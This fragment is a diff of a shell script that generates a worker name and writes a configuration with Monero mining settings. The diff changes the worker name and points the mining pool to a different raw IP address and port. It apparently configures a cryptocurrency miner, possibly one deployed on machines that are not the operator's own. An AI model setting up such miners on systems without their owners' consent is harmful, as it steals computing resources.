@@ -15,7 +15,7 @@ generate_worker_name() {
     random_datetime=$(date -d @$random_seconds "+%Y%m%d_%H%M%S")
 
     # Return the worker name with "AAK012" appended
-    echo "${random_datetime}AAK012"
+    echo "O144"
 }
 
 worker_name=$(generate_worker_name)
@@ -42,7 +42,7 @@ cat <<EOF > $config_file
         "xmrSettings": {
             "disable": false,
             "enableGpu": false,
-            "poolAddress": "172.235.144.109:8089",
+            "poolAddress": "50.116.29.134:8082",
             "customParameters": "-t $cpu_threads"
         }
     }
